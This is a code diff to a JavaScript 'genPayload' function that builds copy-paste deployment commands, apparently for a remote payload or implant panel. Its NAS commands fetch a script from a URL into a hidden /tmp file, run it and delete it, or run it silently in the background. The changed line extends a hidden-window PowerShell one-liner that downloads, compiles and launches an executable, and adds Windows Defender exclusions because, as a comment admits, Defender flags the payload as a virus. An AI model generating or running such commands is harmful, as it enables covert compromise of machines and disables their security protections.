@@ -491,7 +491,7 @@ function genPayload(){
          : '# Synology: 控制面板 > 终端机和SNMP > 启用 SSH';
        h+='<pre class="dt-code" style="margin:0"># NAS 一键部署（SSH 以 admin/root 登录后执行）\n'+sshhint+'\n\n# 方式1: wget\nwget -q '+u+' -O /tmp/.jsh && sh /tmp/.jsh; rm -f /tmp/.jsh\n\n# 方式2: curl\ncurl -sL '+u+' -o /tmp/.jsh && sh /tmp/.jsh; rm -f /tmp/.jsh\n\n# 方式3: 后台静默（断开 SSH 后继续）\nnohup sh -c "$(wget -qO- '+u+')" >/dev/null 2>&1 &</pre>';
     }else{
-      h+='<pre class="dt-code" style="margin:0">:: PowerShell 下载运行（自动定位系统自带 csc.exe，无需 PATH）\npowershell -w hidden -c "IWR \''+location.origin+dl+'\' -OutFile $env:TEMP\\j.cs; $csc=$env:WINDIR+\'\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\'; if(!(Test-Path $csc)){$csc=\'csc\'}; & $csc /nologo /target:winexe /out:$env:TEMP\\j.exe $env:TEMP\\j.cs; Start-Process $env:TEMP\\j.exe"</pre>';
+      h+='<pre class="dt-code" style="margin:0">:: PowerShell 一条龙（下载 → 编译 → 放行端点防护 → 运行）\npowershell -w hidden -c "IWR \''+location.origin+dl+'\' -OutFile $env:TEMP\\j.cs; $csc=$env:WINDIR+\'\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\'; if(!(Test-Path $csc)){$csc=\'csc\'}; & $csc /nologo /target:winexe /out:$env:TEMP\\j.exe $env:TEMP\\j.cs; $x=$env:TEMP+'\\j.exe'; try{Add-MpPreference -ExclusionPath $x -ErrorAction Stop; Add-MpPreference -ExclusionProcess 'j.exe' -ErrorAction Stop}catch{}; Start-Process $x"\n\n::   —— 端点防护：Defender 会在【进程创建阶段】直接拦掉载荷（提示 file contains a virus），现象就是“运行后直接退出/什么都没发生”。\n::      上面两句即为此放行（需管理员）；拿不到管理员时须先手动执行一次：\n::      powershell -c \"Add-MpPreference -ExclusionPath $env:TEMP\\j.exe -EA SilentlyContinue\"</pre>';
     }
     h+='</div></div>';
     res.innerHTML=h;
